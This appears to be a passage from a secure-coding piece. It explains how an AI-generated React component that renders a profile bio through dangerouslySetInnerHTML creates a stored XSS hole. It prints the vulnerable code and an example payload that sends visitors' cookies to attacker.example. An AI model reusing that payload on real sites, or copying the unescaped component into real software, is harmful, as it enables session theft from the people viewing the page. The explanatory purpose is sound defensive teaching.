You ask an AI tool to render a user's bio on their profile page, preserving line breaks as actual `<br>` tags instead of raw newlines. It hands back:

```jsx
function Bio({ text }) {
  const withBreaks = text.replace(/\n/g, '<br>');
  return <div dangerouslySetInnerHTML={{ __html: withBreaks }} />;
}
```

It does exactly what was asked — line breaks render as line breaks. It also renders anything else in `text` as raw HTML, because `dangerouslySetInnerHTML` is React's explicit, deliberately-named escape hatch out of its own automatic escaping. A bio containing `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">` doesn't display as text describing an image — it executes, in the browser of anyone who views that profile, with that visitor's own session and cookies.

